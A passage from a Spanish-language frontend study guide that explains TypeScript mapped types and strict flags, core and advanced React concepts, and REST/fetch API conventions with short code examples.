    `Record`, `Required`) están construidos exactamente así por debajo —
    no son magia del compilador, son mapped types normales que cualquiera
    puede escribir.
  - **Ejemplo paso a paso**:
    ```ts
    interface Usuario {
      id: number;
      nombre: string;
      email: string;
    }

    // Partial<Usuario> hace todas las propiedades opcionales -- así está definido:
    type MiPartial<T> = { [K in keyof T]?: T[K] };

    // Pick<Usuario, 'nombre' | 'email'> selecciona solo esas propiedades:
    type MiPick<T, K extends keyof T> = { [P in K]: T[P] };

    // Uso real de los utility types incluidos:
    function actualizarUsuario(id: number, cambios: Partial<Usuario>) {
      // cambios puede traer solo "nombre", o solo "email", o ambos
    }

    type UsuarioPublico = Omit<Usuario, 'email'>; // Usuario sin el campo email
    ```
    Paso a paso de `MiPartial<Usuario>`: (1) `keyof Usuario` da la unión
    `'id' | 'nombre' | 'email'`; (2) el mapped type itera cada una de esas
    claves `K`; (3) para cada `K`, genera `K?: T[K]` — la misma propiedad,
    pero opcional; (4) el resultado tiene la misma forma que `Usuario`
    pero con todo opcional.

- Discriminated unions y *exhaustiveness checking*

  - **Teoría**: una *discriminated union* es una unión de tipos que
    comparten una propiedad literal común (el "discriminante") que
    permite a TypeScript saber exactamente con cuál de los tipos está
    trabajando dentro de un `switch`/`if`, sin ambigüedad. El
    *exhaustiveness checking* aprovecha el tipo `never`: si asignas el
    valor no manejado a una variable de tipo `never` en la rama `default`,
    el compilador falla en cuanto alguien agregue un caso nuevo a la unión
    y olvide manejarlo en el `switch` — convierte un bug potencial en
    tiempo de ejecución en un error de compilación.
  - **Ejemplo paso a paso**:
    ```ts
    type Estado =
      | { tipo: 'cargando' }
      | { tipo: 'listo'; datos: string[] }
      | { tipo: 'error'; mensaje: string };

    function renderizar(estado: Estado) {
      switch (estado.tipo) {
        case 'cargando':
          return 'Cargando...';
        case 'listo':
          return estado.datos.join(', '); // TS sabe que aquí existe "datos"
        case 'error':
          return estado.mensaje; // TS sabe que aquí existe "mensaje"
        default:
          const _exhaustivo: never = estado; // si falta un caso, ESTO no compila
          return _exhaustivo;
      }
    }
    ```
    Si alguien agrega `{ tipo: 'vacio' }` a `Estado` sin agregar su
    `case`, `estado` en el `default` ya no sería asignable a `never`
    (porque quedaría sin cubrir) y el build fallaría inmediatamente,
    señalando el `switch` que hay que actualizar.

- Inferencia de tipos y *control flow analysis*

  - **Teoría**: TypeScript no necesita anotaciones en todos lados — infiere
    tipos a partir del valor asignado, del contexto (parámetros de un
    callback conocido, como en `array.map`), y sigue el **flujo real del
    código** (*control flow analysis*) para ir refinando el tipo de una
    variable a medida que pasa por condicionales, asignaciones o
    `return`s tempranos.
  - **Ejemplo**:
    ```ts
    let valor = 'hola'; // inferido como string (no como "hola" literal, por ser `let`)

    function procesar(x: string | number | null) {
      if (x === null) return;
      // aquí TS ya descartó null por el análisis de flujo
      if (typeof x === 'string') {
        x.toUpperCase(); // narrowed a string
      } else {
        x.toFixed(2); // lo único que queda es number
      }
    }
    ```

- Flags estrictas del compilador

  - **Teoría**: `strict: true` en `tsconfig.json` activa un conjunto de
    chequeos que, sin ellos, dejan huecos de seguridad de tipos
    importantes. Los dos más impactantes: `strictNullChecks` (sin él,
    `null`/`undefined` son asignables a cualquier tipo, lo que anula gran
    parte del valor de TypeScript) y `noImplicitAny` (obliga a tipar
    explícitamente cuando el compilador no puede inferir nada, en vez de
    caer silenciosamente en `any`). En un proyecto nuevo, `strict: true`
    debería ser la configuración por defecto, no una opción a considerar
    después.
  - **Ejemplo**:
    ```json
    // tsconfig.json
    {
      "compilerOptions": {
        "strict": true
      }
    }
    ```
    ```ts
    function saludar(nombre) {
      // Sin noImplicitAny: "nombre" sería `any` silenciosamente
      // Con noImplicitAny: Error -- "Parameter 'nombre' implicitly has an 'any' type"
      return `Hola ${nombre}`;
    }

    function buscar(id: number): string | null {
      return id === 1 ? 'Ana' : null;
    }
    const resultado = buscar(2);
    resultado.toUpperCase();
    // Sin strictNullChecks: compila, pero explota en runtime si resultado es null
    // Con strictNullChecks: Error de compilación -- hay que verificar null antes
    ```

## 4. React / framework en profundidad

### Básico

- JSX y cómo se compila

  - **Teoría**: en una frase — **JSX** = sintaxis cómoda que se compila a
    `createElement` / `jsx`; produce un **objeto descripción**, no DOM.
    Por eso dentro de `{}` solo van **expresiones**, no `if`/`for`
    sueltos. Al DOM llega después, en el **commit** de ReactDOM.

    JSX (sintaxis parecida a HTML dentro de JS) no es algo que el
    navegador entienda — es **azúcar sintáctico** que un compilador
    (Babel, Vite, Next.js) transforma en llamadas normales a
    `React.createElement()` (o `jsx()` en el transform moderno). Cada
    elemento JSX se convierte en un **objeto plano** ("elemento de
    React") que describe qué renderizar, no en un nodo del DOM todavía.

    Cadena completa hasta el DOM:

    ```
    JSX → createElement/jsx() → render (árbol) → reconciliación (diff) → commit (ReactDOM → DOM real)
    ```

    1. **Elemento** — `createElement` solo crea el objeto descripción;
       no pinta nada.
    2. **Render + reconciliación** — al hacer
       `createRoot(...).render(<App />)`, React ejecuta componentes,
       obtiene el árbol de elementos y lo compara con el anterior
       (Virtual DOM / Fiber).
    3. **Commit** — ReactDOM aplica el mínimo de cambios con APIs del
       navegador (`document.createElement`, `appendChild`, actualizar
       atributos, etc.). Ahí sí aparece el nodo real.

    Analogía: JSX/`createElement` = plano de la casa; reconciliación =
    "solo cambia la ventana"; commit = los albañiles tocan el edificio.

    Por debajo, lo de dentro de un tag son **argumentos de una función**,
    por eso JSX acepta expresiones entre `{}` pero no declaraciones
    (`if`, `for`) directamente — esas van fuera, o se usan ternario /
    `&&` / `.map`.
  - **Ejemplo**:
    ```tsx
    // Esto...
    const elemento = <h1 className="titulo">Hola {nombre}</h1>;

    // ...se compila aproximadamente a esto (aún NO es DOM):
    const elemento = React.createElement(
      'h1',
      { className: 'titulo' },
      'Hola ',
      nombre,
    );
    // ≈ { type: 'h1', props: { className: 'titulo', children: [...] } }

    // El anclaje al DOM real ocurre aquí (ReactDOM):
    const root = createRoot(document.getElementById('root'));
    root.render(<App />); // render → diff → commit (createElement/appendChild del browser)

    // OK — expresiones
    // <h1>{nombre}</h1>
    // {isAdmin ? <Admin /> : <Guest />}
    // {items.map((i) => <li key={i}>{i}</li>)}

    // NO — declaraciones dentro de JSX
    // {if (isAdmin) { return <Admin />; }}
    ```

- Props vs State

  - **Teoría**: **props** son datos que un componente **recibe** desde su
    padre — son de solo lectura desde la perspectiva del componente que
    las recibe (nunca las mutes directamente). **State** son datos que un
    componente **posee y controla él mismo**, y que al cambiar disparan un
    nuevo render de ese componente (y sus hijos). La confusión típica de
    quien empieza es intentar mutar props o mutar state directamente
    (`this.state.x = 5` o `props.x = 5`) en vez de usar el setter
    correspondiente.
  - **Ejemplo**:
    ```tsx
    function Saludo({ nombre }: { nombre: string }) {
      // "nombre" es una prop: viene de fuera, no se reasigna aquí
      const [visitas, setVisitas] = useState(0); // "visitas" es state: vive aquí

      return (
        <div>
          <p>Hola, {nombre}</p>
          <button onClick={() => setVisitas(visitas + 1)}>
            Visitas: {visitas}
          </button>
        </div>
      );
    }
    ```

- Componentes controlados vs no controlados

  - **Teoría**: en una frase — **controlado** = React es la fuente de
    verdad (`value` + `onChange`); **no controlado** = el DOM es la
    fuente de verdad; React lee con `ref` cuando hace falta.

    La pregunta clave: ¿quién es dueño del valor del input?

    Un input **controlado** tiene su valor manejado por React — cada
    tecla dispara `onChange` → actualiza state → re-render con el nuevo
    `value`. Da más control (validar/formatear en cada tecla,
    sincronizar UI) a costa de un re-render por cambio.

    Uno **no controlado** deja que el DOM maneje el valor con
    `defaultValue`; React solo lo consulta cuando lo necesita (vía
    `ref`, p. ej. al enviar). Más simple y barato para formularios donde
    no reaccionas a cada tecla.

    Analogía: controlado = todo pasa por la mesa de mezcla (React);
    no controlado = grabas directo y al final lees la cinta (`ref`).

    Regla práctica: ¿valor en cada cambio / UI reactiva? → controlado.
    ¿Solo al enviar / form grande y simple? → no controlado. No mezcles
    `value` controlado sin `onChange`: React peleará con el input.
  - **Ejemplo**:
    ```tsx
    // Controlado: React es dueño del valor
    function InputControlado() {
      const [valor, setValor] = useState('');
      // 1) usuario escribe → 2) onChange actualiza state → 3) re-render con value nuevo
      return <input value={valor} onChange={(e) => setValor(e.target.value)} />;
    }

    // No controlado: el DOM es dueño; React solo consulta al enviar
    function InputNoControlado() {
      const ref = useRef<HTMLInputElement>(null);
      const enviar = () => console.log(ref.current?.value);
      return <input ref={ref} defaultValue="" />; // defaultValue, no value
    }
    ```

- `key` en listas

  - **Teoría**: en una frase — **`key`** = identidad estable entre
    renders. Con **id** React sabe qué ítem es cuál; con **índice** se
    confunde al reordenar/borrar y el estado puede "saltar" de un ítem a
    otro.

    React usa la prop `key` para identificar de forma estable qué
    elemento de una lista es cuál entre un render y el siguiente, y así
    decidir si **reutiliza** el nodo del DOM (y el estado interno) o
    crea/desmonta uno nuevo.

    Analogía: fichas con nombre. Si las etiquetas son "1º, 2º, 3º" y
    quitas la primera, la que era "2º" pasa a ser "1º" — React cree que
    es la misma ficha con otro contenido, y el estado (input a medias,
    checkbox, focus) se pega al lugar equivocado.

    Usar el índice del array como `key` es un antipatrón común: si la
    lista se reordena, se inserta o se elimina un elemento del medio, los
    índices "se corren" y React asocia el estado del componente
    equivocado. Preferir un **id único y estable**. El índice solo es
    aceptable si la lista es estática y los ítems no tienen estado
    interno. Nunca `key={Math.random()}` (remount constante).
  - **Ejemplo**:
    ```tsx
    // Malo: [A,B,C] → keys 0,1,2; borras A → [B,C] keys 0,1
    // React cree que key 0 "sigue" siendo el mismo ítem, pero ahora es B con estado de A
    {tareas.map((tarea, i) => (
      <TareaItem key={i} tarea={tarea} />
    ))}

    // Bueno: A siempre es key="a", sin importar el orden
    {tareas.map((tarea) => (
      <TareaItem key={tarea.id} tarea={tarea} />
    ))}
    ```

- `useEffect`: dependencias, cleanup y timing

  - **Teoría**: en una frase — **`useEffect`** sincroniza con el mundo
    exterior **después** de pintar; **deps** = cuándo repetirlo;
    **cleanup** = qué deshacer antes de repetir o al desmontar (timers,
    listeners, fetches).

    No es para calcular UI: es para efectos secundarios (fetch,
    suscripciones, timers, DOM). Timing:

    ```
    1. Render → 2. Commit (DOM) → 3. Navegador pinta → 4. useEffect corre
    ```

    El array de dependencias le dice a React cuándo volver a ejecutar:

    - `[]` — solo al montar (cleanup al desmontar)
    - `[userId]` — al montar y cada vez que `userId` cambia
    - omitido — después de cada render (casi nunca lo quieres)

    Si alguna dep cambió: primero corre el **cleanup** del efecto
    anterior, luego el efecto nuevo. La función que retorna el efecto es
    ese cleanup — ahí se cancelan suscripciones, listeners o timers
    (conecta con *memory leaks* de la sección 2).

    Analogía: montas un aparato (efecto) y conectas cables; antes de
    reconectar o al irte (cleanup), desconectas los cables viejos.
  - **Ejemplo**:
    ```tsx
    useEffect(() => {
      const id = setInterval(() => setSegundos((s) => s + 1), 1000);
      return () => clearInterval(id); // cleanup: evita timers acumulados
    }, []); // [] -- una sola vez, al montar

    // Con deps: si cambia userId, limpia y vuelve a pedir
    useEffect(() => {
      let cancelado = false;
      fetch(`/api/users/${userId}`)
        .then((r) => r.json())
        .then((data) => {
          if (!cancelado) setUser(data);
        });
      return () => {
        cancelado = true; // ignora respuesta vieja al cambiar userId / desmontar
      };
    }, [userId]);
    ```

- `useState` vs `useRef`

  - **Teoría**: ambos "recuerdan" un valor entre renders, pero con una
    diferencia clave: cambiar el valor de `useState` **dispara un nuevo
    render**; cambiar `useRef.current` **no dispara ningún render** — es
    una caja mutable que sobrevive entre renders sin notificar a React.
    Usa `useState` para cualquier dato que la UI deba reflejar
    visualmente; usa `useRef` para guardar referencias a nodos del DOM, o
    valores que necesitas recordar pero que no afectan lo que se pinta
    (el ID de un `setTimeout`, el valor anterior de una prop).
  - **Ejemplo**:
    ```tsx
    function Cronometro() {
      const [segundos, setSegundos] = useState(0); // la UI muestra esto -> useState
      const intervaloId = useRef<number | null>(null); // solo control interno -> useRef

      const iniciar = () => {
        intervaloId.current = setInterval(() => setSegundos((s) => s + 1), 1000);
      };
      const detener = () => {
        if (intervaloId.current) clearInterval(intervaloId.current);
      };

      return <button onClick={segundos === 0 ? iniciar : detener}>{segundos}s</button>;
    }
    ```

- Composición: `children` y levantar el estado (*lifting state up*)

  - **Teoría**: en una frase — **`children`** = hueco para que el padre
    meta lo que quiera (composición); **lifting state up** = si hermanos
    comparten datos, el state sube al padre común y baja como props.

    React favorece **composición sobre herencia**: en vez de jerarquías
    que extienden componentes, se combinan piezas pequeñas pasándolas
    como `children` o como props.

    **`children`** es lo que escribes entre las etiquetas — el
    componente actúa de contenedor sin saber qué hay adentro. Analogía:
    un marco de foto (`Card`) vs la foto (`children`).

    **Lifting state up**: cuando dos hermanos necesitan el mismo dato, no
    se lo pasan entre sí (no son padre-hijo). Se "levanta" el estado al
    **ancestro común más cercano**, que pasa valor y setter hacia abajo
    como props (flujo unidireccional: de arriba hacia abajo).
  - **Ejemplo**:
    ```tsx
    // children: el contenedor no decide el contenido
    function Card({ children }: { children: React.ReactNode }) {
      return <div className="card">{children}</div>;
    }
    // <Card><h2>Título</h2><p>Cuerpo</p></Card>

    // Lifting state up: FiltroInput y ListaProductos son hermanos;
    // el estado vive en el padre común PaginaProductos
    //
    // PaginaProductos  ← state aquí
    // ├── FiltroInput  ← valor + onCambiar
    // └── ListaProductos ← filtro
    function PaginaProductos() {
      const [filtro, setFiltro] = useState('');
      return (
        <>
          <FiltroInput valor={filtro} onCambiar={setFiltro} />
          <ListaProductos filtro={filtro} />
        </>
      );
    }
    ```

### En profundidad

- Reconciliación y Fiber

  - **Teoría**: en una frase — **reconciliación** = diff del árbol
    virtual → mínimo cambio al DOM; **Fiber** = arquitectura que permite
    pausar/priorizar ese trabajo. Práctica: mismo tipo se reutiliza; tipo
    distinto se remonta (pierde estado); en listas usa `key` estable.

    Cuando el estado cambia, React no recrea todo el DOM desde cero —
    construye un nuevo árbol de elementos (vuelve a llamar al componente)
    y lo **compara** (*diffing*) con el anterior para calcular el mínimo
    de cambios. Ese proceso es la **reconciliación**. Encaja con la
    cadena de JSX:

    ```
    createElement → árbol de elementos → reconciliación (diff) → commit (DOM real)
    ```

    Analogía: no rehaces toda la casa; miras el plano viejo y el nuevo y
    solo cambias la ventana.

    **Fiber** (desde React 16) es la arquitectura interna que implementa
    la reconciliación de forma pausable y priorizable — hace posible el
    modo concurrente y las Transitions (`REACT19.md`): React puede
    pausar un render de baja prioridad si llega una interacción urgente.
    No programas Fiber a mano; lo notas con `startTransition`, Suspense,
    etc.
  - **Ejemplo (regla práctica que se deriva de esto)**: React asume que
    componentes del mismo tipo en la misma posición son "el mismo" entre
    renders (reutiliza DOM y estado interno), y que tipos distintos son
    completamente diferentes (destruye el viejo y monta uno nuevo,
    perdiendo estado):
    ```tsx
    // Mismo tipo → se reutiliza (conserva estado interno del input)
    return <input />;

    // Tipo distinto → desmonta InputSimple y monta TextAreaAvanzado
    {mostrarEditor ? <TextAreaAvanzado /> : <InputSimple />}

    // Listas: key estable = misma identidad aunque cambie de posición
    // (ver sección `key` en listas)
    ```

- Server Components vs Client Components

  - **Teoría**: en una frase — **Server Component** = corre en servidor,
    cero JS de ese archivo al cliente, ideal para datos; **Client
    Component** = `'use client'`, React "de siempre" con hooks y eventos.
    Marca cliente solo en el borde de la interactividad.

    No son dos "tipos de UI" distintos: es **dónde corre** el componente.

    Los **Server Components** (RSC) se ejecutan **solo en el servidor**,
    su código no viaja al navegador como JS — pueden hacer `await` a una
    DB o al filesystem, y su output es HTML/una descripción serializada,
    reduciendo el bundle. Analogía: cocinan en el restaurante y te traen
    el plato; no te mandan la cocina a casa.

    Los **Client Components** (directiva `'use client'` en Next.js, etc.)
    son los de siempre: corren en el navegador, pueden usar `useState`,
    `useEffect`, `onClick`.

    Regla mental: por defecto todo es Server Component; solo marcas
    `'use client'` en el límite exacto donde empieza la interactividad, y
    empujas ese límite lo más abajo posible. Un Server puede renderizar
    un Client como hijo (props serializables); aísla la interactividad en
    hojas cliente.
  - **Ejemplo**:
    ```tsx
    // ProductPage.tsx -- Server Component (sin 'use client')
    // ProductPage (Server) ← datos, async, sin JS al cliente
    //   └── BotonAgregarCarrito (Client) ← solo este baja al bundle
    async function ProductPage({ id }: { id: string }) {
      const producto = await db.productos.findById(id); // acceso directo, sin API intermedia
      return (
        <div>
          <h1>{producto.nombre}</h1>
          <BotonAgregarCarrito productoId={producto.id} />
        </div>
      );
    }

    // BotonAgregarCarrito.tsx -- Client: estado y eventos
    'use client';
    function BotonAgregarCarrito({ productoId }: { productoId: string }) {
      const [agregado, setAgregado] = useState(false);
      return (
        <button onClick={() => setAgregado(true)}>
          {agregado ? 'Agregado ✓' : 'Agregar'}
        </button>
      );
    }
    ```

- Hooks avanzados y sus trampas: *stale closures*

  - **Teoría**: cada render de un componente crea una nueva "copia" de sus
    funciones internas, cada una con su propio closure sobre las variables
    de ese render específico. Un **stale closure** (closure obsoleto)
    ocurre cuando una función asíncrona o un callback captura el valor de
    una variable de *ese* render, y para cuando finalmente se ejecuta, el
    componente ya re-renderizó con un valor más nuevo — pero la función ya
    quedó "congelada" leyendo el valor viejo.
  - **Ejemplo paso a paso**:
    ```tsx
    function ContadorConBug() {
      const [contador, setContador] = useState(0);

      useEffect(() => {
        const id = setInterval(() => {
          setContador(contador + 1); // BUG: siempre lee el "contador" del primer render (0)
        }, 1000);
        return () => clearInterval(id);
      }, []); // [] hace que este efecto (y su closure) se cree UNA sola vez

      return <p>{contador}</p>; // se queda pegado en 1, nunca sube más
    }
    ```
    Por qué falla: (1) el efecto se ejecuta una vez, con `contador = 0`
    capturado en su closure; (2) cada segundo, `setContador(0 + 1)` pone
    el contador en `1`; (3) React re-renderiza, pero el `setInterval`
    original sigue vivo con el closure viejo, todavía apuntando a
    `contador = 0`; (4) nunca "ve" el nuevo valor porque nunca se volvió a
    crear. La solución es usar la forma funcional del setter, que siempre
    recibe el valor más reciente sin depender del closure:
    ```tsx
    setContador((prev) => prev + 1); // lee el valor actual real, no el capturado
    ```

- Patrones de composición: *compound components* y custom hooks

  - **Teoría**: en una frase — **compound components** = piezas de UI que
    comparten estado implícito (Context) y se componen como HTML;
    **custom hooks** = lógica con estado reutilizable, sin fijar el
    markup. Uno organiza la API visual; el otro extrae comportamiento.

    Los **compound components** son un grupo de componentes que comparten
    estado entre sí (casi siempre vía Context), dando una API declarativa
    donde quien usa el componente no necesita conocer el estado interno
    (`<Tabs><Tabs.List><Tabs.Tab /></Tabs.List></Tabs>`, similar a
    `<select><option>`). Analogía: Lego — piezas sueltas (`Tab`, `Panel`)
    que solo tienen sentido juntas bajo el set (`Tabs`). Ideal cuando
    quieres una API flexible tipo tabs / accordion / menú.

    Los **custom hooks** son la forma moderna de extraer y reutilizar
    *lógica con estado* entre componentes (reemplazan en gran parte a
    HOCs y *render props*). No imponen un árbol de JSX: cada componente
    decide su UI. Deben llamar a otros hooks (por eso el prefijo `use`).
    Ideal para fetch, resize, form state, etc. A menudo se combinan: el
    compound component por dentro usa custom hooks.
  - **Ejemplo**:
    ```tsx
    // Compound components: el padre coordina estado; el consumidor arma el JSX
    // (por debajo, Tabs comparte activeTab vía Context — simplificado aquí)
    <Tabs defaultValue="a">
      <Tabs.List>
        <Tabs.Tab value="a">Uno</Tabs.Tab>
        <Tabs.Tab value="b">Dos</Tabs.Tab>
      </Tabs.List>
      <Tabs.Panel value="a">Contenido A</Tabs.Panel>
      <Tabs.Panel value="b">Contenido B</Tabs.Panel>
    </Tabs>

    // Custom hook: extrae lógica reutilizable (resize) de la UI
    function useWindowWidth() {
      const [width, setWidth] = useState(window.innerWidth);
      useEffect(() => {
        const handler = () => setWidth(window.innerWidth);
        window.addEventListener('resize', handler);
        return () => window.removeEventListener('resize', handler);
      }, []);
      return width;
    }

    function Header() {
      const width = useWindowWidth();
      return <h1>{width < 768 ? 'Menú móvil' : 'Menú completo'}</h1>;
    }
    ```

- Performance: `React.memo`, `useMemo` y `useCallback`

  - **Teoría**: en una frase — **`React.memo`** = no re-renderices el
    hijo si las props no cambiaron; **`useMemo`** = no recalcules un
    valor caro; **`useCallback`** = no crees una función nueva en cada
    render (para que `memo` funcione). Úsalos donde el profiling lo
    justifique.

    Por defecto, cuando un padre re-renderiza, **todos** sus hijos
    también, aunque sus props "parezcan" iguales. Estas tres tools evitan
    trabajo innecesario, pero tienen costo (memoria, comparación) — no
    "por si acaso".

    - `React.memo` — memoiza el **componente**; solo re-renderiza si las
      props cambiaron (comparación superficial `===`).
    - `useMemo` — memoiza el **resultado** de un cálculo / valor entre
      renders (cálculos pesados u objetos/arrays estables como props).
    - `useCallback` — memoiza la **referencia** de una función. En JS dos
      funciones con el mismo código son objetos distintos en cada render;
      sin `useCallback`, eso rompe `React.memo` al pasarlas como prop.

    Analogía: `memo` es un filtro en la puerta del hijo;
    `useMemo`/`useCallback` hacen que las llaves (props) no cambien sin
    necesidad. Regla: mide con Profiler → si el hijo es caro, `memo` →
    estabiliza props con `useMemo`/`useCallback`.
  - **Ejemplo**:
    ```tsx
    const ListaCara = React.memo(function ListaCara({ items, onSelect }) {
      // solo re-renderiza si "items" u "onSelect" cambian de referencia
      return items.map((i) => <Item key={i.id} item={i} onClick={onSelect} />);
    });

    function Padre() {
      const [contador, setContador] = useState(0);
      const items = useMemo(() => calcularItemsCostosos(), []); // valor estable
      const onSelect = useCallback((id) => console.log(id), []); // misma referencia

      return (
        <>
          <button onClick={() => setContador((c) => c + 1)}>{contador}</button>
          <ListaCara items={items} onSelect={onSelect} />
        </>
      );
    }
    ```
    Sin `useCallback` en `onSelect`, cada clic en el botón re-renderiza
    `Padre`, crea una función nueva, `React.memo` la ve como "prop
    distinta" y `ListaCara` re-renderiza igual — anula la optimización.

- Testing de componentes: probar comportamiento, no implementación

  - **Teoría**: en una frase — **buen test de componente** = renderiza →
    actúa como usuario → afirma lo visible. No mires state interno ni
    detalles de implementación; así el test sobrevive a refactors.

    La filosofía de Testing Library es probar la app **como la usaría una
    persona real**: buscar elementos por texto visible o rol accesible, y
    simular clics/tecleo reales — no acceder a estado interno, nombres de
    métodos o `className` frágiles. Analogía: examinas si la puerta se
    abre al girar la llave, no si el cerrojo es de marca X.

    Probar comportamiento (bien) vs implementación (frágil): ¿aparece
    "1" al hacer clic? sí; ¿el state `count` es `1`? no. Prioridad al
    buscar: `getByRole` → `getByLabelText` / `getByText` → `getByTestId`
    (último recurso). Beneficio: refactors (`useState` → `useReducer`) no
    rompen el test; además empujas UI más accesible.
  - **Ejemplo**:
    ```tsx
    import { render, screen } from '@testing-library/react';
    import userEvent from '@testing-library/user-event';

    test('incrementa el contador al hacer clic', async () => {
      render(<Contador />);
      const boton = screen.getByRole('button', { name: /incrementar/i });

      await userEvent.click(boton);

      expect(screen.getByText('1')).toBeInTheDocument();
    });
    // No importa si Contador usa useState o useReducer por dentro:
    // el test solo verifica lo que el usuario ve y hace.
    ```

## 5. APIs y comunicación cliente-servidor

### Básico

- Diseño REST desde el punto de vista del consumidor

  - **Teoría**: en una frase — **REST (visto desde el frontend)** =
    recursos en la URL + verbos HTTP para CRUD. Predecible: misma forma
    de URL, distinta operación según el método. Evita meter la acción en
    el path (`/delete`, `/getX`).

    REST (*REpresentational State Transfer* — ver Glosario) no es un
    estándar rígido, es un estilo: modela el dominio como **recursos**
    (sustantivos, `/products`, `/orders/42`) y usa los verbos HTTP para
    las operaciones (**CRUD** — *Create, Read, Update, Delete*), en vez
    de codificar la acción en la URL (`/getProduct?id=42`).

    Analogía: la URL es la dirección de la casa (`/products/42`); el
    verbo es la acción — mirar (GET), entregar algo nuevo (POST),
    reemplazar (PUT), retocar (PATCH), tirar abajo (DELETE).

    Desde el consumidor importa porque una API bien diseñada es
    predecible: si sabes que `GET /products/42` trae un producto, ya
    intuyes que `DELETE /products/42` lo elimina, sin leer docs por cada
    endpoint. También encaja mejor con caché HTTP, herramientas y
    librerías del ecosistema.
  - **Ejemplo**:
    ```
    GET    /products          -- lista de productos
    GET    /products/42       -- un producto específico
    POST   /products          -- crea un producto nuevo
    PUT    /products/42       -- reemplaza el producto 42 completo
    PATCH  /products/42       -- actualiza parcialmente el producto 42
    DELETE /products/42       -- elimina el producto 42

    ❌  /getProduct?id=42
    ✅  GET /products/42
    ```
    Anti-patrón común: `POST /products/42/delete` en vez de
    `DELETE /products/42` — funciona, pero rompe la convención que el
    resto del ecosistema (herramientas, librerías HTTP, caché) da por
    sentada.

- Fetch API vs XMLHttpRequest, y por qué `fetch` no rechaza en 4xx/5xx

  - **Teoría**: en una frase — **`fetch`** es la API moderna basada en
    Promises; **XHR** es la antigua. `fetch` **solo rechaza por red**;
    4xx/5xx hay que detectarlos con `response.ok` / `status` y lanzar
    error tú mismo.

    **XHR** (*XMLHttpRequest*) es la API original del navegador para
    peticiones asíncronas: eventos (`onload`, `onerror`), sintaxis
    verbosa, hoy legacy. `fetch` es la moderna, basada en Promises /
    `async-await`.

    La trampa: la Promise de `fetch` **solo se rechaza por errores de
    red** (sin conexión, DNS, CORS bloqueado). Un `404` o `500` son
    respuestas HTTP **válidas** (el servidor contestó), así que `fetch`
    las resuelve con éxito a nivel Promise. Analogía: el cartero sí
    entregó el sobre; que dentro diga "no encontrado" lo ves al abrir el
    sobre (`response.ok` / `status`).
  - **Ejemplo**:
    ```ts
    async function obtenerProducto(id: string) {
      const response = await fetch(`/api/products/${id}`);

      // BUG común: asumir que si no lanzó, todo salió bien
      // const data = await response.json(); // explotaría feo / datos basura en un 404

      if (!response.ok) {
        // ok === false si status fuera de 200-299
        throw new Error(`Error ${response.status}: no se pudo obtener el producto`);
      }
      return response.json();
    }
    ```

- Serialización JSON y `Content-Type`

  - **Teoría**: en una frase — **serializar** = objeto JS → string JSON
    (`stringify`); **`Content-Type`** = etiqueta que dice al servidor
    "léelo como JSON". Sin las dos, el body puede viajar mal o no
    parsearse aunque el JSON sea correcto.

    HTTP transporta bytes/texto, no objetos de JS. Al enviar hay que:
    (1) convertir el objeto a string con `JSON.stringify`; (2) declarar
    el formato con el header `Content-Type: application/json`. Analogía:
    metes la carta en el sobre (`stringify`) y pegas la etiqueta del
    idioma (`Content-Type`). Sin etiqueta, el servidor puede no saber
    cómo leerlo.

    Flujo: cliente hace `stringify` + header → viaja el body → servidor
    ve `Content-Type` y hace el equivalente a `JSON.parse`. Al recibir,
    `response.json()` parsea el body de vuelta a objeto JS. Si omites el
    header o el body, muchos backends ignoran el body o fallan el parseo
    (400, body vacío) aunque el JSON en sí sea válido.
  - **Ejemplo**:
    ```ts
    const pedido = { productId: 42, quantity: 2 };

    fetch('/api/orders', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }, // etiqueta: "esto es JSON"
      body: JSON.stringify(pedido), // '{"productId":42,"quantity":2}'
    });

    // ❌ body: { productId: 42 }  — fetch no serializa objetos solo
    // ❌ stringify sin Content-Type — el server puede no parsear
    // Nota: con FormData el browser pone otro Content-Type; no mezclar con stringify
    ```

- Query params vs path params vs body

  - **Teoría**: en una frase — **path** = *quién* (identidad del
    recurso); **query** = *cómo* (filtros/opciones opcionales en la
    URL); **body** = *qué datos* estructurados mando (sobre todo en
    POST/PUT/PATCH).

    Cada uno comunica una intención distinta:

    - **Path params** — van dentro de la URL (`/products/42`). Identifican
      un recurso concreto; el `42` no tiene sentido sin la ruta. Suelen
      ser obligatorios. Analogía: número de departamento en la dirección.
    - **Query params** — después de `?`, separados por `&`
      (`/products?category=zapatos&sort=price`). Filtran, ordenan o
      paginan; son opcionales. Visibles y compartibles, pero no para
      secretos ni payloads grandes (límite de longitud de URL). Analogía:
      instrucciones al portero.
    - **Body** — no va en la URL; viaja en el cuerpo (JSON, etc.). Para
      datos estructurados en `POST`/`PUT`/`PATCH`. Las URLs tienen límite
      de longitud: datos grandes nunca en query. En `GET` casi no se usa
      body. Analogía: el paquete que entregas.

    Regla rápida: ¿identidad? → path. ¿filtro opcional? → query. ¿objeto
    grande a crear/actualizar? → body.
  - **Ejemplo**:
    ```
    GET /products/42?include=reviews&currency=USD
    -- "42"                  -> path param: identifica el recurso
    -- "include", "currency" -> query params: modifican la respuesta, opcionales

    POST /orders
    { "items": [...], "shippingAddress": {...} }
    -- body: estructura completa, no cabría legible en una URL

    // En JS, armar query:
    // const params = new URLSearchParams({ category: 'zapatos', sort: 'price' });
    // fetch(`/api/products?${params}`);

    ✅ GET /products/42?currency=USD
    ❌ GET /products?id=42              (id debería ser path)
    ❌ GET /orders?items=[...]          (payload grande → body + POST)
    ```

- Paginación: offset-based vs cursor-based

  - **Teoría**: en una frase — **offset** = salta N ítems (páginas
    numeradas; frágil si la lista cambia; malo con OFFSET alto);
    **cursor** = "después de este ítem" (estable, mejor para infinite
    scroll; no salta a página arbitraria).

    Paginación = pedir la lista por trozos, no toda de una vez.

    **Offset** (`?page=3&limit=20`): "ignora los primeros
    `(page-1)*limit` y dame `limit`". Permite saltar a cualquier página
    (UI 1, 2, 3…). Problema si la lista cambia mientras paginas: los
    resultados se "corren" (duplicados o ítems saltados). Además, un
    `OFFSET` alto obliga a la DB a recorrer y descartar todas las filas
    anteriores. Analogía: "ábreme el libro en la página 50" — si insertan
    hojas al inicio, esa página ya no es el mismo contenido.

    **Cursor** (`?after=CURSOR&limit=20`): puntero opaco al último
    elemento visto; "dame los siguientes después de este". Estable frente
    a inserciones/eliminaciones y escala mejor (`WHERE id > último`
    en vez de descartar filas). Costo: no puedes ir directo a "página 8",
    solo avanzar (a veces también atrás). Ideal para feeds infinitos.
    Analogía: "continúa desde el marcador", no "página 50".
  - **Ejemplo**:
    ```ts
    // Offset: página 3 = OFFSET 40, LIMIT 20 — simple, inestable si la lista cambia
    fetch('/api/products?page=3&limit=20');
